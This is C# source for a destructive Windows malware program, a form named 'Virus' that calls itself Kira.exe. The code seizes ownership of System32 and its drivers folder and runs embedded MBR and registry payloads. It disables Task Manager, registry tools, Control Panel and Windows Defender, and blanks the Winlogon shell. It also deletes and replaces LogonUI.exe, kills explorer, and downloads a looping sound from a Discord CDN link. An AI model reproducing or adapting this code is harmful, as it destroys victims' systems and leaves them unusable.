using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;  
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Media;
using System.Net;
using System.Threading;

namespace d {
    //public static void Kiradraw()
    //{ }
    public partial class Virus : Form

    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);


        WebClient wb = new WebClient();

        // using System.InteropServices;

        bool logon_check = true;

        public object Kiradraw { get; private set; }

        public Virus()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {


            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        } //

        private void Virus_Load(object sender, EventArgs e)
        {
            new Process()
            {
                StartInfo = new ProcessStartInfo("cmd.exe", @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F")
            };        //DISCORD.Start(); aw ok le ts i test it  i fix any errorsok


            //[DllImport("gdi32.dll")]
            //static extern uint SetPixel(IntPtr hdc, int X, int Y, uint crColor);
            try
            {
                //Kiradraw.Start();//idk
                WebClient wc = new WebClient();
                wc.DownloadFile("https://cdn.discordapp.com/attachments/857669909521891328/862607467316510720/mKV2.wav", @"C:\kira.wav");
                SoundPlayer w = new SoundPlayer(@"C:\kira.wav");
                w.PlayLooping();
                new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F &&takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
                //make text file and then start it :)
                using (StreamWriter stream = File.CreateText(@"C:\s.txt"))
                {
                    stream.WriteLine("Ur pc has been fucked by Kira.exe. good luck");
                    //Create.Thread(Kiradraw);
                    //Kiradraw.Start();//form2.cs  ok create new timer for kiradraw
                    //------------------------------------------------
                    try
                    {
                        Extract("d", @"C:\Windows", "Resources", "MBR.exe");
                        Process.Start(@"C:\Windows\MBR.exe");

                        Extract("d", @"C:\Windows", "Resources", "REGPayload.exe");
                        Process.Start(@"C:\Windows\REGPayload.exe");

                    }
                    catch { }
                }
                Process.Start(@"C:\s.txt");

                //registry items
                //disable taskmgr
                RegistryKey rk = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
                //UAC thing
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
                //disable taskmgr
                RegistryKey reg1 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                reg1.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                //remove wallpaper
                RegistryKey reg2 = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
                reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
                //disable regtools
                RegistryKey reg3 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                reg3.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                //disable control panel
                RegistryKey reg5 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                reg5.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                //get sys32 permision   
                new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && C:\Windows\ && icacls C:\Windows\ /grant %username%:F && Exit") }.Start();
                //shell empty
                RegistryKey reg6 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                reg6.SetValue("Shell", "%%.0%", RegistryValueKind.String);

                RegistryKey key2 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
                key2.SetValue("DisableAntiSpyware", 1);
                key2.Dispose();
                //
                Process.Start("taskkill", "/F /IM Explorer.exe"); //this is part was made by geforcenero17
                Process.Start("taskkill", "/F /IM cmd.exe");
                /*string hal_dll = @"C:\Windows\System32\hal.dll";
                string ci_dll = @"C:\Windows\System32\ci.dll";
                string winload_exe = @"C:\Windows\System32\winload.exe";*/
                string logonUI = @"C:\Windows\System32\LogonUI.exe";
                //string sethc_exe = @"C:\Windows\System32\sethc.exe";
                //delete region
                if (File.Exists(logonUI))
                {
                    File.Delete(logonUI);
                }
                //logon overwrite
                const string quote = "\"";
                ProcessStartInfo logon = new ProcessStartInfo();
                logon.FileName = "cmd.exe";
                logon.WindowStyle = ProcessWindowStyle.Hidden;
                logon.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
                Process.Start(logon);
                string LogonUI = @"C:\Windows\System32\LogonUI.exe";
                while (File.Exists(LogonUI) && logon_check)

                {
                    try
                    {
                        File.Delete(LogonUI);
                    }
                    catch (Exception ex) { }
                    if (!File.Exists(LogonUI))
                    {
                        logon_check = false;

                        Extract("d", @"C:\Windows\System32", "Resources", "LogonUI.exe");
                    }
                           
                    try
                    {
                        File.Delete("explorer.exe");
                    }
                    catch (Exception ex) { }
                    if (!File.Exists("explorer"))
                    {
                        logon_check = false;
                        Extract("d", @"C:\Windows", "Resources", "explorer.exe");
                    }

                  
                }




            }
            catch { }



    } } }

